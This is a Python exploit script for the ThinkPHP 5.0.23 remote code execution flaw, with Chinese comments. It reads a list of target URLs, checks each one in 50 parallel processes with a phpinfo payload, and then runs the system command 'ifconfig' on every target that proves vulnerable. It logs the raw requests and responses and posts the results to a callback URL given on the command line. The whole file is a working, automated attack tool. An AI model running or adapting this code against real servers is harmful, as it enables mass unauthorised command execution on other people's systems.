#!/usr/bin/env python
# coding=utf-8
import argparse
import requests
import json
import platform
import os
import time
from multiprocessing import Pool
import traceback
from urllib.parse import urlparse

def ResponseHook(rep, **kwargs):
    rep.encoding = 'utf-8'
    # 状态码及http版本
    request_str = """%s %s HTTP/%.1f
""" % (rep.request.method, rep.request.path_url, rep.raw.version * 0.1)
    # 遍历headers将字典转换成字符串
    request_str += f"""Host: {urlparse(rep.url).netloc}
"""
    for k, v in dict(rep.request.headers).items():
        request_str += f"""{k}: {v}
"""
    # 请求体
    if rep.request.body:
        request_str += """
""" + str(rep.request.body)
        
    all_req_payload = """{}""".format(request_str)
    print("all_req_payload")
    print(all_req_payload)
    resp_str = 'HTTP/%.1f %d %s\n' % (rep.raw.version * 0.1, rep.raw.status,
                                                  rep.raw.reason)
    for k, v in dict(rep.headers).items():
        resp_str += f"{k}: {v}\n"
    resp_str += '\n' + rep.text
    #print(resp_str)
    #base64str = make_pic(str(time.time()),lines)
    base64str = ""
    try:
        with open("vul.txt",errors="ignore",encoding='UTF-8') as f:
            vullist_json = json.load(f)
        run_complete_attack_url = []
        for vulinfo in vullist_json:
            vul_url_json = vulinfo["vul_url"]
            if rep.url == vul_url_json:
                #payload = all_req_payload
                temp = {"vul_id":vulinfo["vul_id"],"vul_url":rep.url,"flag":vulinfo["flag"],"base64str":base64str,"payload":all_req_payload}
                run_complete_attack_url.append(temp)
            else:
                run_complete_attack_url.append(vulinfo)
        with open("vul.txt",'w',errors="ignore") as w:
            data2 = json.dumps(run_complete_attack_url)
            w.write(data2)
            w.flush()
            run_complete_attack_url = []
    except Exception as e:
        print('traceback.print_exc(): ', traceback.print_exc())
    
def verify_vul(vul_info,num):
    vul_id = vul_info["vul_id"]
    vul_url = vul_info["vul_url"]

    pocdict = {
        "vulnname":"ThinkPHP5 5.0.23 远程代码执行漏洞",
        "isvul": False,
        "vulnurl":"",
        "payload":"",
        "proof":"",
        "response":"",
        "exception":""
    }
    headers = {
        "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.90 Safari/537.36",
    }
    payload = {
        '_method':'__construct',
        'filter[]':'phpinfo',
        'method':'get',
        'server[REQUEST_METHOD]':'1',
    }
    try:
        req = requests.post(vul_url, data=payload, headers=headers, timeout=15, verify=False)

        if 'phpinfo()' in req.text and 'PHP Version' in req.text and 'www.php.net' in req.text:
            try:
                with open("vul.txt",errors="ignore",encoding='UTF-8') as f:
                    vullist_json = json.load(f)
                    print(vullist_json)
                    print("-"*15)
                run_complete_verify_url = vullist_json
                run_complete_verify_url.append({"vul_id":vul_id,"vul_url":vul_url,"flag":True,"base64str":"","payload":""})
                with open("vul.txt",'w',errors="ignore") as w:
                    data2 = json.dumps(run_complete_verify_url)
                    w.write(data2)
                    w.flush()
            except  Exception as e:
                print('traceback.print_exc(): ', traceback.print_exc())
        else:
            try:
                with open("vul.txt",errors="ignore",encoding='UTF-8') as f:
                    vullist_json = json.load(f)
                    print(vullist_json)
                    print("-"*15)
                run_complete_verify_url = vullist_json
                run_complete_verify_url.append({"vul_id":vul_id,"vul_url":vul_url,"flag":False,"base64str":"","payload":""})
                with open("vul.txt",'w',errors="ignore") as w:
                    data2 = json.dumps(run_complete_verify_url)
                    w.write(data2)
                    w.flush()
            except  Exception as e:
                print('traceback.print_exc(): ', traceback.print_exc())
    except Exception as e:
        print(e)


def attack_vul(vul_info,num):
    print("attack_vul")
    vul_id = vul_info["vul_id"]
    vul_url = vul_info["vul_url"]

    headers = {
        "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.90 Safari/537.36",
    }
    payload = {
        '_method':'__construct',
        'filter[]':'system',
        'method':'get',
        'server[REQUEST_METHOD]':'ifconfig'
    }
    try:
        req = requests.post(vul_url, data=payload, headers=headers, timeout=15, verify=False,hooks={'response': ResponseHook})
    except Exception as e:
        print(e)

def poolmana(target):
    vullist = []
    with open(target,errors="ignore",encoding='UTF-8') as f:
        vullist_json = json.load(f)
        vullist = vullist_json["data"]

    #验证
    num = 0
    p = Pool(processes=50)
    li = []
    for vul_info in vullist:
        try:
            num += 1
            print(num)
            print(vul_info)
            res = p.apply_async(verify_vul,args=(vul_info,num,))
            li.append(res)
            print(num)
        except Exception as e:
            print(e)
            pass
    p.close()
    p.join()
    
    #攻击
    p = Pool(processes=50)
    li = []
    with open("vul.txt",errors="ignore",encoding='UTF-8') as f:
        vullist = json.load(f)
    print("*"*10)
    
    num = 0    
    for vul_info in vullist:
        try:
            if vul_info["flag"]:
                num += 1
                res = p.apply_async(attack_vul,args=(vul_info,num,))
                li.append(res)
                
        except Exception as e:
            print(e)
            pass
    p.close()
    p.join()  

if __name__ == '__main__':
    
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest='target', help="json数据")
    parser.add_argument("-u", "--url", dest='url', help="返回接口")
    parser.add_argument("-uid", "--uuid", dest='uuid', help="用户id")
    parser.add_argument("-sid", "--scanid", dest='scanid', help="任务id")
    
    args = parser.parse_args()
    with open("vul.txt",'w+',errors="ignore") as w:
        data2 = json.dumps([])
        w.write(data2)
        print(data2)
    poolmana(args.target)
    print("程序运行结束，查收")
    with open("vul.txt",errors="ignore",encoding='UTF-8') as f:
        vullist_json = json.load(f)
    info_list = {"uuid":args.uuid,"scanid":args.scanid,"vul_info":vullist_json}
    print(info_list)
    rep = requests.post(url=args.url,json=info_list)
    #print(rep.text)
    #python ThinkPHP5_5.0.23_Remote_Code_Execution_exp.py -t 1.txt -u http://a -uid 2 -sid 3
